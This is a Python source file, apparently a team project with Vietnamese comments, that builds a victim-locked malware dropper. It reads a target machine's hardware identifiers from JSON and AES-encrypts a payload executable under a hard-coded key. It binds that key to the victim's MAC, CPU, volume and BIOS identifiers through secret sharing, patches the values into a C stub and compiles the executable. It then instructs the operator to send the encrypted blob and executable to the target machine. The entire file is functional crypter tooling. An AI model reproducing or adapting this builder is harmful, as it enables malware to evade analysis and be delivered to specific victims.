import os
import random
import hashlib
import re
import subprocess
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import argparse

# Import hàm tạo mảnh khóa từ file encrypt.py của Thành viên A
from encrypt import sss_encrypt_byte

def sha256_xor_fold(input_string):
    """Băm SHA-256 thông tin đầu vào và gập XOR (trái sang phải) thành 1 byte."""
    hash_bytes = hashlib.sha256(input_string.encode('utf-8')).digest()
    folded = hash_bytes[0]
    for i in range(1, 32):
        folded ^= hash_bytes[i]
    return folded

def read_target_json(json_path):
    print("\n==================================================")
    print(f"[*] BƯỚC 0: ĐỌC THÔNG TIN MỤC TIÊU TỪ '{json_path}'")
    print("==================================================")
    
    if not os.path.exists(json_path):
        print(f"[-] LỖI: Không tìm thấy file cấu hình '{json_path}'!")
        return None
    
    try:
        with open(json_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        victim_infos = [
            data.get("mac_address", ""),
            data.get("computer_name", ""),
            data.get("cpu_id", ""),
            data.get("volume_serial", ""),
            data.get("bios_serial", "")
        ]
        
        print("[D] Các thông tin lấy từ file json:")
        print(victim_infos)
        print("_____________________________________")
        
        empty_indices = [i for i, val in enumerate(victim_infos) if val.strip() == ""]
        if empty_indices:
            print(f"[-] LỖI: File JSON bị thiếu dữ liệu ở các trường số {empty_indices}.")
            return None
            
        print("[+] Đọc file cấu hình JSON thành công!")
        return victim_infos
        
    except json.JSONDecodeError:
        print(f"[-] LỖI: File '{json_path}' bị sai cú pháp JSON.")
        return None

def run_step_1_and_2(payload_path, target_infos):
    print("==================================================")
    print("[*] ĐANG CHẠY BƯỚC 1 & 2: CHUẨN BỊ DỮ LIỆU...")
    print("==================================================")
    
    # --- 1. XỬ LÝ KHÓA SSS (GIỮ NGUYÊN 8 BYTE) ---
    SECRET_KEY_STRING = 'cardlike'
    secret_key = [ord(c) for c in SECRET_KEY_STRING]
    print(f"[D] secret_key (8 bytes) = {secret_key}")
    
    shares = []
    for i in range(8):
        shares.append(sss_encrypt_byte(secret_key[i]))

    # --- 2. XỬ LÝ MÃ HÓA PAYLOAD (AES-128-ECB) ---
    if not os.path.exists(payload_path):
        print(f"[-] LỖI: Không tìm thấy file '{payload_path}'")
        return None

    # Nhân đôi khóa 8 byte thành 16 byte để dùng cho AES
    aes_key_string = SECRET_KEY_STRING * 2  # 'cardlikecardlike'
    aes_key_bytes = aes_key_string.encode('utf-8')
    print(f"[D] AES key (16 bytes)   = {list(aes_key_bytes)}")

    # Đọc bản rõ
    with open(payload_path, 'rb') as f:
        payload_data = f.read()

    # Padding PKCS#7 và mã hóa AES ECB
    cipher = AES.new(aes_key_bytes, AES.MODE_ECB)
    padded_payload = pad(payload_data, AES.block_size)
    encrypted_payload = cipher.encrypt(padded_payload)
    
    # Ghi thẳng ra file m.bin
    with open("m.bin", "wb") as f:
        f.write(encrypted_payload)
    print("[+] Đã mã hóa AES-128-ECB và lưu payload ra file 'm.bin'.")
    
    # Tính kích thước bản mã (có thể stub sẽ cần để cấp phát động)
    encrypted_payload_size = len(encrypted_payload)

    # --- 3. XỬ LÝ RÀNG BUỘC PHẦN CỨNG (GIỮ NGUYÊN) ---
    x_coords = []
    y_coords = []
    for i in range(8):
        x_coords.append([share[0] for share in shares[i]])
        y_coords.append([share[1] for share in shares[i]])

    S = []
    for i in range(5):
        folded_byte = sha256_xor_fold(target_infos[i])
        S.append(folded_byte)

    check_bytes = []
    for i in range(8):
        one_check_bytes = []
        for j in range(5):
            cb = S[j] ^ x_coords[i][j]
            one_check_bytes.append(cb)
        check_bytes.append(one_check_bytes)

    c_array_check_bytes = "{ " + ", ".join(
        "{ " + ", ".join(f"0x{b:02X}" for b in row) + " }"
        for row in check_bytes
    ) + " }"
    
    c_array_share_y = "{ " + ", ".join(
        "{ " + ", ".join(f"0x{b:02X}" for b in row) + " }"
        for row in y_coords
    ) + " }"

    key_hash_array = []
    for i in range(8):
        byte_hash = hashlib.sha256(bytes([secret_key[i]])).digest()
        key_hash_array.append(byte_hash)
    
    c_array_hash_key_verif = "{\n" + ", ".join(
        "{\n    " + ", ".join(f"0x{b:02X}" for b in hash_bytes) + "\n}"
        for hash_bytes in key_hash_array
    ) + "\n}"
    
    print("[+] Đã chuẩn bị xong toàn bộ dữ liệu C-array.")
    return {
        "payload_size": str(encrypted_payload_size), # Giữ lại phòng trường hợp Stub C cần dùng
        "hash_key_verif": c_array_hash_key_verif,
        "check_bytes_array": c_array_check_bytes,
        "share_y_array": c_array_share_y
    }

def run_step_3_patch_stub(stub_path, output_path, builder_data):
    print("==================================================")
    print("\n[*] BƯỚC 3: LẮP RÁP DỮ LIỆU VÀO STUB (FIND & REPLACE)...")
    print("==================================================")
    if not os.path.exists(stub_path):
        print(f"[-] LỖI: Không tìm thấy file stub '{stub_path}'")
        return False

    with open(stub_path, 'r', encoding='utf-8') as f:
        stub_code = f.read()

# # --- [DIFF SỬA ĐỔI TẠI ĐÂY] ---
#     # 1. Kích thước Payload: Tìm đích danh dòng khai báo và thay thế
#     # Hỗ trợ linh hoạt khoảng trắng và các giá trị hex mặc định (VD: 0x12345678)
#     stub_code = re.sub(
#         r'unsigned\s+int\s+payload_size\s*=\s*0x[0-9a-fA-F]+;',
#         f'unsigned int payload_size = {builder_data["payload_size"]};',
#         stub_code,
#         count=1
#     )
#     # ------------------------------

    # 1. Kích thước Payload (Thay thế vào vị trí 0x12345678 nếu code C của bạn vẫn cần)
    stub_code = stub_code.replace("0x12345678", builder_data['payload_size'])

    # 2. Thay thế Mảng CheckBytes [8][5]
    stub_code = re.sub(
        r'unsigned char check_bytes\[8\]\[5\][^;]+;',
        f'unsigned char check_bytes[8][5] = {builder_data["check_bytes_array"]};',
        stub_code,
        flags=re.DOTALL,
        count=1
    )

    # 3. Thay thế Mảng Share_Y [8][5]
    stub_code = re.sub(
        r'unsigned char share_y\[8\]\[5\][^;]+;',
        f'unsigned char share_y[8][5] = {builder_data["share_y_array"]};',
        stub_code,
        flags=re.DOTALL,
        count=1
    )

    # 4. Thay thế Mảng Hash Key Verif [8][32]
    stub_code = re.sub(
        r'unsigned char hash_key_verif\[8\]\[32\][^;]+;',
        f'unsigned char hash_key_verif[8][32] = {builder_data["hash_key_verif"]};',
        stub_code,
        flags=re.DOTALL,
        count=1
    )

    # Ghi ra file stub_ready
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(stub_code)
    
    print(f"[+] Lắp ráp thành công! Đã tạo ra file: '{output_path}'")
    return True


def run_step_4_compile(stub_ready_file, output_exe_name):
    print("\n==================================================")
    print(f"[*] BƯỚC 4: BIÊN DỊCH TỰ ĐỘNG THÀNH '{output_exe_name}'")
    print("==================================================")

    # Đã loại bỏ phần gọi rc.exe biên dịch resource
    
    if not os.path.exists(stub_ready_file):
        print(f"[-] LỖI: Không tìm thấy file mã nguồn '{stub_ready_file}' để biên dịch.")
        return False

    # Đã loại bỏ resource.res khỏi lệnh biên dịch
    compile_command = [
        "cl.exe", "/MT", "/O2", 
        stub_ready_file, 
        f"/Fe{output_exe_name}",
    ]
    
    print(f"[+] Lệnh thực thi: {' '.join(compile_command)}")
    print("[*] Trình biên dịch đang xử lý, vui lòng chờ...")
    
    try:
        result = subprocess.run(compile_command, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[+] XUẤT XƯỞNG THÀNH CÔNG! Đã tạo ra file: {output_exe_name}")
            print(f"[*] Lưu ý: Hãy gửi kèm file 'm.bin' cùng với '{output_exe_name}' cho máy mục tiêu.")
            
            obj_file = stub_ready_file.replace(".cpp", ".obj").replace(".c", ".obj")
            if os.path.exists(obj_file):
                os.remove(obj_file)
                
            return True
        else:
            print("[-] LỖI TRONG QUÁ TRÌNH BIÊN DỊCH CỦA CL.EXE:")
            print(result.stdout)
            print(result.stderr)
            return False
            
    except FileNotFoundError:
        print("[-] LỖI MÔI TRƯỜNG: Không tìm thấy trình biên dịch 'cl.exe'!")
        return False


# if __name__ == "__main__":
#     target_json_file   = "target_N.json"
#     payload_file = "msource.exe"   
#     stub_template_file = "stub3 - debugged info.cpp"    
#     stub_ready_file = "stub_ready.cpp"  
#     final_output_exe = "enc_msource.exe"

#     victim_infos = read_target_json(target_json_file)
#     if victim_infos:
#         builder_data = run_step_1_and_2(payload_file, victim_infos)
        
#         if builder_data:
#             if run_step_3_patch_stub(stub_template_file, stub_ready_file, builder_data):
#                 run_step_4_compile(stub_ready_file, final_output_exe)

if __name__ == "__main__":
    # Khởi tạo bộ phân tích tham số dòng lệnh
    parser = argparse.ArgumentParser(description="Builder tool với cấu hình động.")
    
    # Định nghĩa các tham số (có giá trị mặc định nếu người dùng bỏ qua)
    parser.add_argument("--json", default="target_N.json", help="Đường dẫn file JSON mục tiêu (Mặc định: target_N.json)")
    parser.add_argument("--payload", default="msource.exe", help="Đường dẫn file payload gốc (Mặc định: msource.exe)")
    
    # Đọc các tham số truyền vào
    args = parser.parse_args()

    # Gán vào các biến chạy hệ thống
    target_json_file   = args.json
    payload_file       = args.payload
    
    # Các file cố định khác giữ nguyên
    stub_template_file = "stub3 - debugged info.cpp"    
    stub_ready_file    = "stub_ready.cpp"  
    final_output_exe   = "enc_msource.exe"

    # Tiếp tục logic chạy cũ của chương trình
    victim_infos = read_target_json(target_json_file)
    if victim_infos:
        builder_data = run_step_1_and_2(payload_file, victim_infos)
        
        if builder_data:
            if run_step_3_patch_stub(stub_template_file, stub_ready_file, builder_data):
                run_step_4_compile(stub_ready_file, final_output_exe)